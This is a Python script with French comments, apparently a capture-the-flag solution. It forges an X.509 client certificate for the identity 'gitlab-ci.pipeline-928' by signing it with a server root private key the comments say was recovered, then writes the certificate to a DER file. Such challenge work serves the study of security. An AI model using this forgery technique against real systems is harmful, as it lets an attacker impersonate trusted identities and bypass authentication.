from typing import Optional
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, padding, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
from cryptography.x509.oid import NameOID
import datetime
import sys


# ===================================
# Quel serveur cible ?
# ===================================
# Par défaut on appelle l'instance "locale", sauf si on utilise -REMOTE dans les arguments de lancement
if '-REMOTE' in sys.argv:
    root_pk_filename = 'aegissecureforgeserver.chall.malicecyber.com_aegis.root.pem'
else:
    root_pk_filename = 'local_aegis.root.pem'

# On peut activer le niveau debug, en rajoutant DEBUG dans les arguments de lancement
#context.log_level = 'debug'


# ===================================
# Functions récupérées du code source du serveur, utiles pour la génération d'un certificat
# ===================================
def generate_ecc_key():
    private_key = ec.generate_private_key(ec.SECP256R1())
    return private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

def generate_certificate(
    subject_name: str,
    key_pair: PrivateKeyTypes,
    issuer_certificate: Optional[x509.Certificate] = None,
    issuer_key: Optional[PrivateKeyTypes] = None,
) -> x509.Certificate:
    subject = x509.Name(
        [
            x509.NameAttribute(NameOID.COMMON_NAME, subject_name),
        ]
    )
    certificate_builder = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(
            subject if issuer_certificate is None else issuer_certificate.issuer
        )
        .public_key(key_pair.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
    )

    signing_key = (
        key_pair if issuer_certificate is None and issuer_key is None else issuer_key
    )
    return certificate_builder.sign(signing_key, hashes.SHA256(), default_backend())


def load_key_from_pem(pem_filename):
    pem_file = open(pem_filename, 'rb')
    pem = pem_file.read()
    key = serialization.load_pem_private_key(pem, password=None, backend=default_backend())
    return key


# ===================================
# Génération d'un certificat DER signé avec la clé privée du serveur, émise par AEgisSecureForge
# ===================================
# Génération d'un certificat à partir de la clé privée du serveur récupérée
root_pk = load_key_from_pem(root_pk_filename)
root_cert = generate_certificate("AEgisSecureForge", root_pk)

# Génération d'une clé privée
client_pk = generate_ecc_key()
client_pk = serialization.load_pem_private_key(client_pk, password=None, backend=default_backend())

# Génération d'un certificat client DER signé avec la clé privée du serveur
common_name = 'gitlab-ci.pipeline-928'
forged_cert = generate_certificate(common_name, client_pk, root_cert, root_pk,)
forged_cert = forged_cert.public_bytes(encoding=serialization.Encoding.DER)
print(f'{forged_cert=}')
print(f'{len(forged_cert)=}')

# Extraction du certificat dans un fichier
with open('forged-cert.der', 'wb') as output_file:
    output_file.write(forged_cert)
